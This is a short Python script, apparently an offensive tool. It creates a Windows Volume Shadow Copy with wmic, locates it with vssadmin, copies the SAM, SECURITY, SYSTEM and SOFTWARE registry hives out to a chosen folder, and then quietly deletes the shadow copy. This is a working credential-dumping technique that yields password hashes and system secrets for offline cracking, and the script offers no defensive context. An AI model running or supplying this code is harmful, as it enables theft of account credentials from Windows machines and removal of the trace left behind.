import subprocess
import os
import shutil

def create_shadow_copy():
    command = ["wmic", "shadowcopy", "call", "create", "volume='C:\\'"]
    result = subprocess.run(command, capture_output=True, text=True)

    if "ShadowID" in result.stdout:
        shadow_id = result.stdout.split("ShadowID = ")[1].split(";")[0].strip().replace('"', '')
        print(f"[SUCCESS] Created shadow copy with ID: {shadow_id}")
        return shadow_id
    else:
        print("[ERROR] Failed to create shadow copy")
        return None

def get_shadow_path(shadow_id):
    command = ["vssadmin", "list", "shadows"]
    result = subprocess.run(command, capture_output=True, text=True).stdout.splitlines()

    for i, line in enumerate(result):
        if shadow_id.lower() in line.lower():
            for j in range(i, len(result)):
                if "Shadow Copy Volume" in result[j]:
                    shadow_volume_path = result[j].split("Shadow Copy Volume: ")[1].strip()
                    print(f"[SUCCESS] Retrieved shadow volume path: {shadow_volume_path}")
                    return shadow_volume_path

def delete_shadow_copy(shadow_id):
    command = ["wmic", "shadowcopy", "where", f"ID='{shadow_id}'", "delete"]
    subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[SUCCESS] Deleted shadow copy with ID: {shadow_id}")

def clone_registry(dest_path):
    shadow_id = create_shadow_copy()
    dest_path = os.path.join(dest_path, "registry")
    shadow_volume_path = get_shadow_path(shadow_id)

    registry_path = {
        "SAM": os.path.join(shadow_volume_path, "Windows", "System32", "config", "SAM"),
        "SECURITY": os.path.join(shadow_volume_path, "Windows", "System32", "config", "SECURITY"),
        "SYSTEM": os.path.join(shadow_volume_path, "Windows", "System32", "config", "SYSTEM"),
        "SOFTWARE": os.path.join(shadow_volume_path, "Windows", "System32", "config", "SOFTWARE"),
    }

    for file, src_path in registry_path.items():
        save_path = os.path.join(dest_path, f"{file}")
        shutil.copy(src_path, save_path)
        print(f"[SUCCESS] {file} file saved as: {save_path}")

    delete_shadow_copy(shadow_id)